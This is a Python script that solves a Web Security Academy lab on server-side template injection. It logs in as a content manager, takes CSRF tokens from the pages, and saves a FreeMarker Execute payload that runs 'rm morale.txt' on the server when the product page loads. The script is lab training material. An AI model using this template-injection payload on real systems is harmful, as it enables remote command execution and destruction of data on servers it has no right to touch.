########################################################################
#
# Lab: Server-side template injection using documentation
#
# Hack Steps:
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie to login
#      3. Login as content-manager
#      4. Fetch a product template
#      5. Extract the csrf token to edit the template
#      6. Edit the template and inject the malicious payload
#      7. Fetch the product page after editing to execute the payload
#
########################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5a00b003cc61ae83e364fc00820008.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as content-manager.. ", end="", flush=True)

    data = { "username": "content-manager", "password": "C0nt3ntM4n4g3r", "csrf": csrf_token }
    cookies = { "session": session }
    content_manager_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching a product template.. ", end="", flush=True)

    session = content_manager_login.cookies.get("session")
    cookies = { "session": session }
    template_page = fetch("/product/template?productId=1", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the csrf token to edit the template.. ", end="", flush=True)

    csrf_token = re.findall("csrf.+value=\"(.+)\"", template_page.text)[0]
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Editing the template and injecting the malicious payload.. ", end="", flush=True)

    payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm morale.txt")}"""
    data = {  "template": payload, "csrf": csrf_token, "template-action": "save" }
    post_data("/product/template?productId=1", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the product page after editing to execute the payload.. ", end="", flush=True)

    fetch("/product?productId=1") # productId should be the same as the one used in editing template

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The morale.txt file is successfully deleted")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

